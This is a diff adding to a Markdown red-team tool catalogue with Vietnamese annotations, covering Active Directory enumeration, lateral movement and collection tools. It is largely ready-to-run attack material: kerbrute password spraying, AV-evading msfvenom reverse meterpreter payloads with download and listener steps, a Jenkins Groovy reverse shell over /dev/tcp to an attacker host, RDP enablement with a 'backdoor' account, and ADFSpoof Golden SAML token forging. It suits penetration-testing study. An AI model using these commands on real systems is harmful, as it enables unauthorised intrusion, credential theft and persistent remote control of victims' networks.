@@ -3838,3 +3838,1350 @@ adidnsdump -u icorp\\testuser icorp-dc.internal.corp
 adidnsdump -u icorp\\testuser icorp-dc.internal.corp -r
 ```
 **Lưu ý:** Sử dụng **công cụ adidnsdump**. `-u` cung cấp thông tin xác thực user (`domain\username`) để kết nối tới Domain Controller
+
+### [🔙](#tool-list)[**adidnsdump**](https://github.com/dirkjanm/adidnsdump)
+
+By default any user in **Active Directory** can enumerate all DNS records in the **Domain or Forest DNS zones**, similar to a zone transfer.
+
+This tool enables enumeration and exporting of all DNS records in the zone for **recon** purposes of internal networks.
+
+**Install (Pip):**
+
+```bash
+pip install git+https://github.com/dirkjanm/adidnsdump#egg=adidnsdump
+```
+**Lưu ý:** Cài đặt **công cụ Python adidnsdump** trực tiếp từ URL **GitHub** bằng pip.
+
+**Install (Git):**
+
+```bash
+git clone https://github.com/dirkjanm/adidnsdump
+cd adidnsdump
+pip install .
+```
+**Lưu ý:** Cài đặt từ mã nguồn bằng **Git** và pip.
+
+**Note:** *The tool requires `impacket` and `dnspython` to function. While the tool works with both **Python 2** and **3, Python 3** support requires you to install [impacket from GitHub](https://github.com/CoreSecurity/impacket).*
+**Lưu ý:** Lưu ý quan trọng về các thư viện **Python** phụ thuộc (`impacket`, `dnspython`).
+
+**Cách sử dụng:**
+
+```bash
+# Hiển thị các zone trong domain hiện tại
+adidnsdump -u icorp\\testuser --print-zones icorp-dc.internal.corp
+
+# Hiển thị tất cả các zone trong domain
+adidnsdump -u icorp\\testuser icorp-dc.internal.corp
+
+# Resolve tất cả các bản ghi chưa biết (-r)
+adidnsdump -u icorp\\testuser icorp-dc.internal.corp -r
+```
+**Lưu ý:** Sử dụng **công cụ adidnsdump**. `-u` cung cấp thông tin xác thực user (`domain\username`) để kết nối tới Domain Controller (`icorp-dc.internal.corp`). `--print-zones` chỉ hiển thị các zone có sẵn, bỏ qua các bản ghi chi tiết. Chạy không có `--print-zones` sẽ **dump** tất cả các bản ghi **DNS**. Cờ `-r` cố gắng resolve (tra cứu IP) các bản ghi được **dump**. Kỹ thuật này dựa vào cấu hình mặc định của **Active Directory** cho phép mọi người dùng đọc các bản ghi **DNS** của zone.
+
+[Blog - Getting in the Zone: dumping Active Directory DNS using adidnsdump](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)
+
+![adidnsdump](https://user-images.githubusercontent.com/100603074/210986363-724e6611-12e9-4a0d-abfa-c44665010b97.jpg)
+
+*Hình ảnh được sử dụng từ https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/*
+
+### [🔙](#tool-list)[**kerbrute**](https://github.com/ropnop/kerbrute)
+
+A tool to quickly bruteforce and enumerate valid **Active Directory accounts** through **Kerberos Pre-Authentication**.
+
+**Install (Go):**
+
+```bash
+go get github.com/ropnop/kerbrute
+```
+**Lưu ý:** Cài đặt **công cụ Golang** **kerbrute**.
+
+**Install (Make):**
+
+```bash
+git clone https://github.com/ropnop/kerbrute
+cd kerbrute
+make all
+```
+**Lưu ý:** Biên dịch từ mã nguồn bằng **Git** và **Make**.
+
+**Cách sử dụng:**
+
+```bash
+# Liệt kê người dùng
+./kerbrute_linux_amd64 userenum -d lab.ropnop.com usernames.txt
+
+# Password Spray
+./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com domain_users.txt Password123
+
+# Brute User
+./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com passwords.lst thoffman
+
+# Brute Force
+./kerbrute -d lab.ropnop.com bruteforce -
+```
+**Lưu ý:** Các ví dụ sử dụng tệp nhị phân `kerbrute` trên **Linux**. `-d` chỉ định tên miền **Active Directory**. `userenum` thực hiện liệt kê tên người dùng từ một danh sách (`usernames.txt`) thông qua phản hồi lỗi **Kerberos pre-authentication**. `passwordspray` thực hiện tấn công password spray (`Password123`) lên một danh sách người dùng domain (`domain_users.txt`). `bruteuser` **brute force** mật khẩu cho một người dùng cụ thể (`thoffman`) từ một wordlist mật khẩu (`passwords.lst`).
+
+![image](https://user-images.githubusercontent.com/100603074/212205129-e5906b50-78c5-4507-8b1e-74a6686bed14.png)
+
+*Hình ảnh được sử dụng từ https://matthewomccorkle.github.io/day_032_kerbrute/*
+
+### [🔙](#tool-list)[**scavenger**](https://github.com/SpiderLabs/scavenger)
+
+**Scavenger** is a multi-threaded **post-exploitation** scanning tool for scavenging systems, finding most frequently used files and folders as well as "interesting" files containing sensitive information.
+
+**Scavenger** confronts a challenging issue typically faced by **Penetration Testing** consultants during internal penetration tests; the issue of having too much access to too many systems with limited days for testing.
+
+**Install:**
+
+First install **CrackMapExec** from [tại đây](https://github.com/byt3bl33d8d/CrackMapExec/wiki/Installation).
+**Lưu ý:** **Scavenger** phụ thuộc vào **CrackMapExec**, vì vậy cần cài đặt **CME** trước.
+
+```bash
+git clone https://github.com/SpiderLabs/scavenger
+cd scavenger
+```
+**Lưu ý:** Tải mã nguồn của **Scavenger**.
+
+**Cách sử dụng:**
+
+```bash
+# Tìm các tệp đáng chú ý trên điểm cuối của nạn nhân
+python3 ./scavenger.py smb -t 10.0.0.10 -u administrator -p Password123 -d test.local
+```
+**Lưu ý:** Chạy **script Python scavenger.py**. `smb` chỉ định giao thức để quét (**SMB file shares**). `-t` là IP mục tiêu. `-u`, `-p`, `-d` cung cấp thông tin xác thực **domain** để truy cập các share. **Scavenger** sẽ tìm kiếm các tệp và thư mục theo các quy tắc định sẵn để phát hiện thông tin nhạy cảm.
+
+Nice [blog post](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/scavenger-post-exploitation-tool-for-collecting-vital-data/).
+
+![image](https://user-images.githubusercontent.com/100603074/216736914-e7a7fe26-3531-4ae1-9962-fce130d8ab62.png)
+
+*Hình ảnh được sử dụng từ https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/scavenger-post-exploitation-tool-for-collecting-vital-data/*
+
+**Lateral Movement**
+====================
+
+### [🔙](#tool-list)[**crackmapexec**](https://github.com/Porchetta-Industries/CrackMapExec)
+
+This is a great tool for pivoting in a **Windows/Active Directory** environment using credential pairs (**username:password**, **username:hash**). It also offered other features including enumerating logged on users and spidering SMB shares to executing psexec style attacks, auto-injecting Mimikatz/Shellcode/DLL’s into memory using Powershell, dumping the NTDS.dit and more.
+
+**Install:**
+
+```bash
+sudo apt install crackmapexec
+```
+**Lưu ý:** Cài đặt tiêu chuẩn trên **Linux/Debian/Ubuntu** sử dụng **apt**.
+
+**Cách sử dụng:**
+
+```bash
+crackmapexec smb <ip address> -d <domain> -u <user list> -p <password list>
+```
+**Lưu ý:** Sử dụng `crackmapexec` với subcommand `smb` để tương tác qua giao thức **SMB**. `<ip address>` là IP của máy mục tiêu hoặc dải IP/file IP. `-d` là tên domain. `-u` và `-p` cung cấp danh sách người dùng và mật khẩu/hash để thử đăng nhập vào máy mục tiêu. Sau khi đăng nhập thành công, **CrackMapExec** có thể thực hiện nhiều tác vụ khác như thực thi lệnh, liệt kê session, truy cập share...
+
+![image](https://user-images.githubusercontent.com/100603074/192070626-4549ec06-e2c5-477b-a97d-0f29e48bbfbc.png)
+
+### [🔙](#tool-list)[**WMIOps**](https://github.com/FortyNorthSecurity/WMIOps)
+
+**WMIOps** is a powershell script that uses WMI to perform a variety of actions on hosts, local or remote, within a Windows environment.
+
+Developed by [@christruncer](https://twitter.com/christruncer).
+
+Original [blog post](https://www.christophertruncer.com/introducing-wmi-ops/) documenting release.
+
+**Install (PowerShell):**
+
+```bash
+git clone https://github.com/FortyNorthSecurity/WMIOps
+Import-Module WMIOps.ps1
+```
+**Lưu ý:** Tải mã nguồn script **PowerShell** và import nó vào phiên PowerShell hiện tại.
+
+**Cách sử dụng:**
+
+```bash
+# Thực thi lệnh do người dùng chỉ định trên máy mục tiêu
+Invoke-ExecCommandWMI
+
+# Trả về tất cả các tiến trình đang chạy từ máy mục tiêu
+Get-RunningProcessesWMI
+
+# Kiểm tra xem người dùng có hoạt động tại desktop trên máy mục tiêu không (hoặc nếu vắng mặt)
+Find-ActiveUsersWMI
+
+# Liệt kê tất cả các ổ đĩa cục bộ và được kết nối mạng trên hệ thống mục tiêu
+Get-SystemDrivesWMI
+
+# Thực thi một script powershell trong bộ nhớ trên máy chủ mục tiêu thông qua WMI và trả về kết quả
+Invoke-RemoteScriptWithOutput
+```
+**Lưu ý:** Các hàm (cmdlet) của module **WMIOps**. Chúng sử dụng **WMI** để thực hiện các tác vụ từ xa trên các máy **Windows** mục tiêu. Cần quyền quản trị trên máy mục tiêu để thực hiện hầu hết các tác vụ này thông qua **WMI**.
+
+![image](https://user-images.githubusercontent.com/100603074/210266302-9c098f03-24fd-4f91-af63-db2fe04c01c7.png)
+
+![image](https://user-images.githubusercontent.com/100603074/210266314-e51c7c99-1e2a-473e-926c-074b56fe79a5.png)
+
+*Images used from https://pentestlab.blog/2017/11/20/command-and-control-wmi/*
+
+### [🔙](#tool-list)[**PowerLessShell**](https://github.com/Mr-Un1k0d3r/PowerLessShell)
+
+Tool that uses **MSBuild.exe** to remotely execute **PowerShell scripts** and commands without spawning **powershell.exe**.
+
+**Install:**
+
+```bash
+git clone https://github.com/Mr-Un1k0d3r/PowerLessShell
+cd PowerLessShell
+```
+**Lưu ý:** Tải mã nguồn bằng **Git**. Công cụ này chủ yếu dựa vào một **script Python** để tạo các file dự án **MSBuild**.
+
+**Cách sử dụng:**
+
+```bash
+# Help
+python PowerLessShell.py -h
+
+# Generate PowerShell payload
+python PowerLessShell.py -type powershell -source script.ps1 -output malicious.csproj
+
+# Generating a shellcode payload
+python PowerLessShell.py -source shellcode.raw -output malicious.csproj
+```
+**Lưu ý:** Sử dụng **script Python PowerLessShell.py**. Công cụ này tạo ra một file `.csproj` (file dự án **Visual Studio**) chứa mã **XML** lợi dụng chức năng tích hợp sẵn của **MSBuild.exe** để thực thi mã tùy ý. File `.csproj` được tạo này sau đó có thể được chạy trên máy **Windows** mục tiêu bằng **MSBuild.exe**. Điều này giúp thực thi **PowerShell** hoặc shellcode mà không trực tiếp chạy tiến trình **powershell.exe**.
+
+Full usage information can be found [tại đây](https://github.com/Mr-Un1k0d3r/PowerLessShell#usage).
+
+![image](https://user-images.githubusercontent.com/100603074/210266357-75a3f09d-9855-46d5-ad13-69c677b4499f.png)
+
+*Image used from https://bank-security.medium.com/how-to-running-powershell-commands-without-powershell-exe-a6a19595f628*
+
+### [🔙](#tool-list)[**PsExec**](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec)
+
+**PsExec** is a part of the **Sysinternals** suite of tools, which is a collection of utilities for managing and troubleshooting **Windows systems**.
+
+It is great for remotely executing commands on target machines.
+
+**Note:** Some AVs detect **PsExec** as a 'remote admin' virus.
+**Lưu ý:** **PsExec** là một **công cụ** chính thống của **Microsoft** nhưng do khả năng thực thi từ xa của nó, nó thường bị **AV** gắn cờ như một công cụ quản trị từ xa có khả năng bị lạm dụng (Potentially Unwanted Application - **PUA** hoặc "hacker tool").
+
+**Install (PowerShell):**
+
+```bash
+Invoke-WebRequest -Uri 'https://download.sysinternals.com/files/PSTools.zip' -OutFile 'pstools.zip'
+Expand-Archive -Path 'pstools.zip' -DestinationPath "$env:TEMP\pstools"
+Move-Item -Path "$env:TEMP\pstools\psexec.exe" .
+Remove-Item -Path "$env:TEMP\pstools" -Recurse
+```
+**Lưu ý:** Đoạn mã **PowerShell** này tải về gói **PSTools** của **Sysinternals**, giải nén, di chuyển chỉ tệp **psexec.exe** vào thư mục hiện tại và xóa các tệp tạm thời. Cách cài đặt tiện lợi trên **Windows PowerShell**.
+
+**Cách sử dụng:**
+
+```bash
+# Prevent the license agreement from being displayed
+psexec.exe /accepteula
+
+# Run the 'hostname' command on remote machine
+psexec.exe \\REMOTECOMPUTER hostname
+
+# Run the 'hostname' command on EVERYTHING (on the domain)
+psexec.exe \\* hostname
+
+# Run a local executable on a remote machine
+psexec.exe \\REMOTECOMPUTER -c C:\Tools\program.exe
+
+# Run the 'hostname' command with different credentials
+psexec.exe \\REMOTECOMPUTER hostname -u localadmin -p secret-p@$$word
+
+# Spawn shell on remote machine
+psexec.exe -s \\REMOTECOMPUTER cmd
+```
+**Lưu ý:** Các ví dụ sử dụng **PsExec.exe** với các tùy chọn dòng lệnh. Cần quyền quản trị trên máy tính từ xa để sử dụng **PsExec**. `\\REMOTECOMPUTER` được thay thế bằng tên máy tính hoặc địa chỉ IP. `/accepteula` bỏ qua yêu cầu chấp nhận EULA lần đầu. `-c` copy file thực thi từ máy local đến máy remote và chạy nó. `-u` và `-p` cung cấp thông tin xác thực. `-s` chạy tiến trình với quyền SYSTEM trên máy từ xa, hữu ích để có shell **SYSTEM**. **PsExec** sử dụng kết nối **SMB** và dịch vụ ẩn (psexesvc) để thực thi.
+
+Great [blog post](https://adamtheautomator.com/psexec/) on **PsExec** usage.
+
+![image](https://user-images.githubusercontent.com/100603074/210266376-8daa51d6-16d4-4422-b723-d1bc8b7f22e2.png)
+
+*Image used from https://adamtheautomator.com/psexec/*
+
+### [🔙](#tool-list)[**LiquidSnake**](https://github.com/RiccardoAncarani/LiquidSnake)
+
+**Liquid Snake** is a program aimed at performing **lateral movement** against **Windows systems** without touching the disk.
+
+The tool relies on **WMI Event Subscription** in order to execute a **.NET assembly** in memory, the **.NET assembly** will listen for a shellcode on a named pipe and then execute it using a variation of the thread hijacking shellcode injection.
+
+The project is composed by two separate solutions:
+
+- `CSharpNamedPipeLoader` - the component that will be transformed in **VBS** via **GadgetToJScript**
+- `LiquidSnake` - the component responsible to creating the **WMI Event Subscription** on the remote system
+
+**Install:**
+
+Open both solutions in Visual Studio and build. *Make sure to target x64 architecture for the **CSharpNamedPipeLoader**.*
+
+Output: Two separate EXEs: `CSharpNamedPipeLoader.exe` and `LiquidSnake.exe`
+**Lưu ý:** Hướng dẫn biên dịch mã nguồn C# bằng **Visual Studio**. Cần tạo ra hai file thực thi riêng biệt.
+
+Full build information can be found [tại đây](https://github.com/RiccardoAncarani/LiquidSnake#building).
+
+**Cách sử dụng:**
+
+Use `LiquidSnake.exe` agains a host where you have administrative access over as follows:
+
+```bash
+LiquidSnake.exe <host> [<username> <password> <domain>]
+LiquidSnake.exe dc01.isengard.local
+LiquidSnake.exe dc01.isengard.local saruman DeathToFrodo123 isengard.local
+```
+**Lưu ý:** Lệnh chạy công cụ chính `LiquidSnake.exe` trên máy attacker, kết nối đến máy **Windows** mục tiêu từ xa (`<host>`) bằng thông tin xác thực được cung cấp. Công cụ này sẽ sử dụng **WMI** để tạo một sự kiện đăng ký (event subscription) thực thi loader (`CSharpNamedPipeLoader.exe`, đã được nhúng trong VBS hoặc JScript?) trong bộ nhớ của tiến trình trên máy remote. Loader này sau đó sẽ lắng nghe trên một named pipe để nhận shellcode từ attacker.
+
+If everything went fine, you should obtain an output similar as the following:
+
+```bash
+[*] Event filter created.
+[*] Event consumer created.
+[*] Subscription created, now sleeping
+[*] Sending some DCOM love..
+[*] Sleeping again... long day
+```
+
+General usage information can be found [tại đây](https://github.com/RiccardoAncarani/LiquidSnake#usage).
+
+Full `LiquidSnake` usage information can be found [tại đây](https://github.com/RiccardoAncarani/LiquidSnake/tree/main/LiquidSnake).
+
+![LiquidSnake](https://user-images.githubusercontent.com/100603074/210986763-2ffe49dd-597b-4ca2-a3ad-674b5fe39624.jpg)
+
+*Image used from https://github.com/RiccardoAncarani/LiquidSnake#usage*
+
+### [🔙](#tool-list)Bật **RDP**
+
+```shell
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
+net localgroup "Remote Desktop Users" "backdoor" /add
+```
+**Lưu ý:** Bộ lệnh này được thực thi trên **CMD/PowerShell** của máy **Windows** mục tiêu để bật **Remote Desktop Protocol (RDP)** và cho phép truy cập.
+`reg add ... fDenyTSConnections /d 0`: Thay đổi registry để cho phép kết nối RDP.
+`netsh ... enable=Yes`: Bật quy tắc firewall tích hợp sẵn cho Remote Desktop.
+`net localgroup ... /add`: Thêm một tài khoản người dùng (ở đây là 'backdoor', giả định đã tạo tài khoản này) vào nhóm "Remote Desktop Users" cục bộ để cho phép tài khoản này đăng nhập qua RDP. Cần quyền quản trị để chạy các lệnh này.
+
+### [🔙](#tool-list)Nâng cấp shell lên **meterpreter**
+
+Shells (https://infinitelogins.com/tag/payloads/)
+
+After getting basic shell access to an endpoint a **meterpreter** is nicer to continue with.
+**Lưu ý:** **Meterpreter** là một **payload** hậu khai thác tiên tiến của **Metasploit** cung cấp nhiều khả năng hơn **reverse shell** đơn giản.
+
+**[attacker]** Generate a meterpreter shell:
+
+```shell
+msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe
+msfvenom -p linux/x86/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
+```
+**Lưu ý:** Sử dụng `msfvenom` để tạo tệp thực thi **reverse meterpreter** cho **Windows** hoặc **Linux**. `-p` chỉ định payload, `-a` kiến trúc, `--encoder` mã hóa shellcode để né tránh **AV** (shikata_ga_nai là encoder nổi tiếng), `LHOST/LPORT` địa chỉ/cổng của attacker, `-f` định dạng output, `-o` tên file output.
+
+![image](https://user-images.githubusercontent.com/100603074/193451669-ff745cf6-e103-4f7e-a266-f7f224dfbb0a.png)
+
+**[victim]** Download to victim endpoint:
+
+```shell
+powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/shell-name.exe','shell-name.exe')"`
+```
+**Lưu ý:** Lệnh **PowerShell** tải tệp thực thi **shell** đã tạo về máy nạn nhân từ một web server do attacker điều khiển (`http://<ip>:8000`).
+
+**[attacker]** Configure listener:
+
+```shell
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST your-ip
+set LPORT listening-port run`
+```
+**Lưu ý:** (Đã giải thích ở trên) Thiết lập listener trong **Metasploit Framework** để nhận kết nối ngược lại từ payload **meterpreter**.
+
+**[victim]** Execute payload:
+
+```shell
+Start-Process "shell-name.exe"`
+```
+**Lưu ý:** Lệnh **PowerShell** để thực thi tệp shell đã tải xuống trên máy nạn nhân. Khi chạy, nó sẽ kết nối ngược về listener của attacker.
+
+![image](https://user-images.githubusercontent.com/100603074/193452305-91b769a7-96c4-43d3-b3e2-6e31b3afec27.png)
+
+### [🔙](#tool-list)Forwarding Ports
+
+Sometimes, after gaining access to an endpoint there are local ports. Making these internal ports external routable can help for lateral movement to other services on the host.
+**Lưu ý:** **Port forwarding** là kỹ thuật cho phép attacker truy cập các dịch vụ chỉ có sẵn trên mạng nội bộ/loopback của máy nạn nhân từ máy của attacker.
+
+```bash
+socat TCP-LISTEN:8888,fork TCP:127.0.0.1:80 &
+socat TCP-LISTEN:EXTERNAL_PORT,fork TCP:127.0.0.1:INTERNAL_PORT &
+```
+**Lưu ý:** Các lệnh này sử dụng **công cụ `socat`** (Socket CAT) trên máy nạn nhân (thường là **Linux**, cần cài đặt `socat`) để thực hiện **port forwarding**. `TCP-LISTEN:EXTERNAL_PORT,fork` tạo một listener TCP trên cổng `EXTERNAL_PORT` trên máy nạn nhân. Khi có kết nối đến cổng này, nó sẽ tạo một tiến trình con (`fork`) và chuyển tiếp (`TCP:127.0.0.1:INTERNAL_PORT`) kết nối đến dịch vụ đang chạy trên `127.0.0.1:INTERNAL_PORT` (ví dụ: dịch vụ web trên cổng 80 hoặc dịch vụ khác). Dấu `&` để chạy lệnh trong nền. **EXTERNAL_PORT** sẽ là cổng mà attacker kết nối tới trên máy nạn nhân, còn **INTERNAL_PORT** là cổng của dịch vụ trên máy nạn nhân.
+
+### [🔙](#tool-list)Jenkins reverse shell
+
+If you gain access to a **jenkins script console** you can use this to gain a **reverse shell** on the node.
+**Lưu ý:** Jenkins là một server automation phổ biến. Script Console là một tính năng cho phép chạy mã Groovy tùy ý trên server hoặc agent. Nếu kẻ tấn công có quyền truy cập Script Console, họ có thể lợi dụng để có shell trên máy đó.
+
+```jenkins
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/IP_ADDRESS/PORT;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+```
+**Lưu ý:** Đây là mã **Groovy** (hoặc Java snippet) được thực thi trong Jenkins Script Console trên một agent **Linux/Unix**. Nó sử dụng **Java Runtime** để thực thi lệnh shell (`/bin/bash -c ...`). Lệnh bash tạo kết nối **TCP** ngược đến `IP_ADDRESS:PORT` của attacker và tạo một reverse shell tương tác qua kết nối đó. Đây là một kỹ thuật rất hiệu quả nếu Script Console không bị hạn chế.
+
+### [🔙](#tool-list)[**ADFSpoof**](https://github.com/mandiant/ADFSpoof)
+
+Created by Doug Bienstock [@doughsec](https://twitter.com/doughsec) while at Mandiant FireEye.
+
+**ADFSpoof** has two main functions:
+
+1. Given the **EncryptedPFX** blob from the **AD FS** configuration database and **DKM decryption key** from **Active Directory**, produce a usable key/cert pair for **token signing**.
+2. Given a signing key, produce a signed security token that can be used to access a federated application.
+
+This tool is meant to be used in conjunction with **ADFSDump**. **ADFSDump** runs on an **AD FS server** and outputs important information that you will need to use **ADFSpoof**.
+
+**Install:**
+
+**Note:** ***ADFSpoof** requires the installation of a custom fork of the **Python Cryptography package**, available [tại đây](https://github.com/dmb2168/cryptography).*
+**Lưu ý:** Yêu cầu **Python** và thư viện **cryptography**, với lưu ý cần dùng một bản fork tùy chỉnh.
+
+```bash
+git clone https://github.com/mandiant/ADFSpoof
+pip install -r requirements.txt
+```
+**Lưu ý:** Tải mã nguồn và cài đặt các dependency Python.
+
+**Cách sử dụng:**
+
+```bash
+# Decrypt the EncryptedPFX and write to disk
+python ADFSpoof.py -b EncryptedPfx.bin DKMkey.bin dump
+
+# Generate a security token for Office365
+python ADFSpoof.py -b EncryptedPfx.bin DkmKey.bin -s sts.doughcorp.com o365 --upn robin@doughcorp.co --objectguid {1C1D4BA4-B513-XXX-XXX-3308B907D759
+```
+**Lưu ý:** Sử dụng **script Python ADFSpoof.py**. Công cụ này xử lý các output từ **ADFSDump** (`EncryptedPFX.bin` và `DKMkey.bin`). Chế độ `dump` trích xuất key/cert signing. Chế độ tạo token (ở đây là cho `o365` qua `sts.doughcorp.com`) sử dụng key signing để tạo một **token SAML** giả mạo với **User Principal Name (UPN)** và **ObjectGUID** của người dùng mục tiêu. **Golden SAML attack** cho phép truy cập vào các dịch vụ **Microsoft 365/Azure** như người dùng mục tiêu mà không cần mật khẩu hoặc MFA, bằng cách giả mạo việc xác thực từ **AD FS**.
+
+Full usage information can be found [tại đây](https://github.com/mandiant/ADFSpoof#usage).
+
+Additional command examples can be found [tại đây](https://github.com/mandiant/ADFSpoof#examples).
+
+![image](https://user-images.githubusercontent.com/100603074/211530527-02e63fe3-5dda-4a81-8895-c140aec4eeca.png)
+
+*Hình ảnh được sử dụng từ https://github.com/mandiant/ADFSpoof#usage*
+
+### [🔙](#tool-list)[**Coercer**](https://github.com/p0dalirius/Coercer)
+
+A python script to automatically coerce a Windows server to authenticate on an arbitrary machine through many methods.
+
+Features:
+
+- Lists open **SMB pipes** on the remote machine (in modes scan authenticated and fuzz authenticated)
+-  Tries to connect on a list of known **SMB pipes** on the remote machine (in modes scan unauthenticated and fuzz unauthenticated)
+-  Calls one by one all the vulnerable **RPC** functions to coerce the server to authenticate on an arbitrary machine.
+-  Random UNC paths generation to avoid caching failed attempts (all modes)
+-  Configurable delay between attempts with `--delay`
+
+More feature information [tại đây](https://github.com/p0dalirius/Coercer#features).
+
+**Install (pip):**
+
+```bash
+sudo python3 -m pip install coercer
+```
+**Lưu ý:** Cài đặt công cụ từ **PyPI** bằng `pip`.
+
+**Cách sử dụng:**
+
+```bash
+# Scan mode (Assess the Remote Procedure Calls listening on a machine)
+./Coercer.py scan -t 192.168.1.1 -u 'username' -p 'password' -d test.locl -v
+
+# Coerce mode (Exploit the Remote Procedure Calls on a remote machine to coerce an authentication to ntlmrelay or responder)
+./Coercer.py coerce -l 192.168.1.2 -t 192.168.1.1 -u 'username' -p 'password' -d test.locl -v
+
+# Fuzz mode (Fuzz Remote Procedure Calls listening on a machine)
+./Coercer.py fuzz -t 192.168.1.1 -u 'username' -p 'password' -d test.locl -v
+```
+**Lưu ý:** Sử dụng **script Python Coercer.py** với các chế độ (`scan`, `coerce`, `fuzz`). `-t` là máy chủ Windows mục tiêu, `-l` là địa chỉ IP của listener của attacker (nơi **Responder** hoặc công cụ relay NTLM đang chạy). `-u`, `-p`, `-d` là thông tin xác thực để kết nối ban đầu (có thể không cần thiết cho một số kỹ thuật). `coerce` mode gọi các hàm **RPC** trên máy mục tiêu để buộc nó khởi tạo một kết nối **SMB/RPC** ngược về máy của attacker, nơi thông tin xác thực **NTLM hash** (của tài khoản dịch vụ hoặc máy tính) có thể bị bắt và/hoặc relay (ví dụ: NTLM relay attack).
+
+![image](https://user-images.githubusercontent.com/100603074/216737001-3195a6c4-3d41-431d-88ce-ed35ed474d33.png)
+
+*Hình ảnh được sử dụng từ https://github.com/p0dalirius/Coercer#quick-start*
+
+**Collection**
+====================
+
+### [🔙](#tool-list)[**BloodHound**](https://github.com/BloodHoundAD/BloodHound)
+
+An application used to visualize **active directory environments**. A quick way to visualise **attack paths** and understand victims' **active directory properties**.
+
+**Install:** [PenTestPartners Walkthrough](https://www.pentestpartners.com/security-blog/bloodhound-walkthrough-a-tool-for-many-tradecrafts/)
+**Lưu ý:** **BloodHound** có cả client (UI) và server (database graph). Thường cần cài đặt cả hai. Wiki hoặc các hướng dẫn cài đặt chuyên sâu cung cấp các bước cụ thể (Docker, Neo4j, cách chạy ingestor...).
+
+**Custom Queries:** [CompassSecurity BloodHoundQueries](https://github.com/CompassSecurity/BloodHoundQueries)
+**Lưu ý:** Các truy vấn tùy chỉnh cho **BloodHound** giúp tìm kiếm các **attack path** phức tạp hoặc cụ thể trong đồ thị AD.
+
+![image](https://user-images.githubusercontent.com/100603074/206549387-a63e5f0e-aa75-47f6-b51a-942434648ee2.png)
+
+### [🔙](#tool-list)[**Snaffler**](https://github.com/SnaffCon/Snaffler)
+
+**Snaffler** is an advanced **credential scanner/collector** for **Active Directory** environments. *With a great [README](https://github.com/SnaffCon/Snaffler/blob/master/README.md)*.
+
+**Snaffler** uses a system of "classifiers", each of which examine shares or folders or files or file contents, passing some items downstream to the next classifier, and discarding others. Each classifier uses a set of rules to decide what to do with the items it classifies.
+
+*More information about **Snaffler** [rules](https://github.com/SnaffCon/Snaffler#i-am-a-mighty-titan-of-tedium-a-master-of-the-mundane-i-wish-to-write-my-own-ruleset).*
+
+'*Broadly speaking - it gets a list of **Windows computers** from **Active Directory**, then spreads out its snaffly appendages to them all to figure out which ones have file shares, and whether you can read them.*' - Snaffler README (2023)
+**Lưu ý:** **Snaffler** tập trung vào việc quét các file share và nội dung file trên nhiều máy tính **Windows** trong một domain để tìm thông tin nhạy cảm.
+
+**Install:**
+
+You can download the binary from the [GitHub Releases Page](https://github.com/SnaffCon/Snaffler/releases).
+**Lưu ý:** Tải xuống file `.exe` đã biên dịch sẵn.
+
+**Cách sử dụng:**
+
+```bash
+# Targeted local scan (less likely to trigger detections)
+Snaffler.exe -s -i C:\
+
+# Go in loud and find everything
+snaffler.exe -s -o snaffler.log
+```
+**Lưu ý:** Sử dụng **công cụ Snaffler.exe** với các tùy chọn. `-s` bắt đầu quá trình quét. `-i C:\` quét cục bộ từ ổ C. `-o snaffler.log` xuất kết quả ra file log. **Snaffler** sử dụng các bộ phân loại (classifiers) và luật (`rules`) để tìm kiếm. Chạy ở chế độ "loud" có thể tạo ra nhiều lưu lượng mạng và hành vi đọc file, dễ bị phát hiện bởi các biện pháp giám sát.
+
+![image](https://user-images.githubusercontent.com/100603074/210266420-a658a48e-2945-4d06-9aff-e3fb14664829.png)
+
+*Image used from https://github.com/SnaffCon/Snaffler#what-does-it-look-like*
+
+### [🔙](#tool-list)[**linWinPwn**](https://github.com/lefayjey/linWinPwn)
+
+**linWinPwn** is a **bash script** that automates a number of **Active Directory Enumeration and Vulnerability** checks.
+
+The script uses a number of tools and serves as wrapper of them. Tools include: **impacket, bloodhound, crackmapexec, enum4linux-ng, ldapdomaindump, lsassy, smbmap, kerbrute, adidnsdump, certipy, silenthound**, and others.
+
+**linWinPwn** is particularly useful when you have access to an **Active Directory** environment for a limited time only, and you wish to automate the enumeration process and collect evidence efficiently.
+**Lưu ý:** **linWinPwn** là một script tích hợp, tự động hóa việc chạy nhiều **công cụ** khác nhau trong một pipeline để thu thập thông tin về AD. Chạy trên **Linux**, nhắm mục tiêu **Active Directory**.
+
+**Install:**
+
+```bash
+git clone https://github.com/lefayjey/linWinPwn
+cd linWinPwn; chmod +x linWinPwn.sh
+chmod +x install.sh
+./install.sh
+```
+**Lưu ý:** Cài đặt **script bash** **linWinPwn** và chạy **script cài đặt** của nó, có thể yêu cầu **Git** và các **tool** khác (impacket, bloodhound-python, crackmapexec, ...) đã được cài đặt trước.
+
+**Cách sử dụng:**
+
+```bash
+# Default: interactive - Open interactive menu to run checks separately
+./linWinPwn.sh -t <Domain_Controller_IP> [-d <AD_domain> -u <AD_user> -p <AD_password_or_hash[LM:NT]_or_kerbticket[./krb5cc_ticket]> -o <output_dir>]
+
+# Auto config - Run NTP sync with target DC and add entry to /etc/hosts before running the modules
+./linWinPwn.sh -t <Domain_Controller_IP> --auto-config
+
+# LDAPS - Use LDAPS instead of LDAP (port 636)
+./linWinPwn.sh -t <Domain_Controller_IP> --ldaps
+
+# Module pwd_dump: Password Dump
